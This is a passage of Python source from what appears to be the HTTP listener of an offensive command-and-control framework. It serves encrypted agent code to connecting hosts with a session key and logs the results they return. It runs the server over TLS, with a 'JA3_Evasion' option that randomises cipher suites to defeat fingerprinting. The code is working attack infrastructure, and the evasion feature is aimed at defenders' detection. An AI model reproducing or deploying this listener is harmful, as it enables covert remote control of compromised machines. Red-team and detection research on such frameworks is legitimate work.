                        else:
                            agentCode = ""

                        sessionKey = bytes.fromhex(sessionKey)

                        encryptedAgent = AESCipher.encrypt_then_hmac(
                            sessionKey, agentCode.encode("UTF-8")
                        )
                        return make_response(
                            packets.build_routing_packet(
                                stagingKey, sessionID, language, encData=encryptedAgent
                            ),
                            200,
                        )

                elif results[:10].lower().startswith(b"error") or results[
                    :10
                ].lower().startswith(b"exception"):
                    listenerName = self.options["Name"]["Value"]
                    message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
                    self.instance_log.error(message)
                    return make_response(self.default_response(), 404)
                elif results.startswith(b"VALID"):
                    listenerName = self.options["Name"]["Value"]
                    message = f"{listenerName}: Valid results returned by {clientIP}"
                    self.instance_log.info(message)
                    return make_response(self.default_response(), 200)
                else:
                    return make_response(results, 200)
            return None

        try:
            certPath = listenerOptions["CertPath"]["Value"]
            ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]

            if certPath.strip() != "":
                cert_path = Path(certPath).resolve()

                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                context.load_cert_chain(
                    cert_path / cert_util.CERT_FILENAME,
                    cert_path / cert_util.KEY_FILENAME,
                )

                if ja3_evasion:
                    context.set_ciphers(listener_util.generate_random_cipher())

                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            listenerName = self.options["Name"]["Value"]
            log.error(
                f"{listenerName}: Listener startup on port {port} failed: {e}",
                exc_info=True,
            )

    def start(self):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.thread property.
        """
        listenerOptions = self.options
        self.thread = helpers.KThread(target=self.start_server, args=(listenerOptions,))
        self.thread.daemon = True
        self.thread.start()
        time.sleep(0.1 if os.environ.get("TEST_MODE") else 1)
        # returns True if the listener successfully started, false otherwise
        return self.thread.is_alive()

    def shutdown(self):
        """
        Terminates the server thread stored in the self.thread property.
        """
        to_kill = self.options["Name"]["Value"]
        self.instance_log.info(f"{to_kill}: shutting down...")
        log.info(f"{to_kill}: shutting down...")
        self.thread.kill()
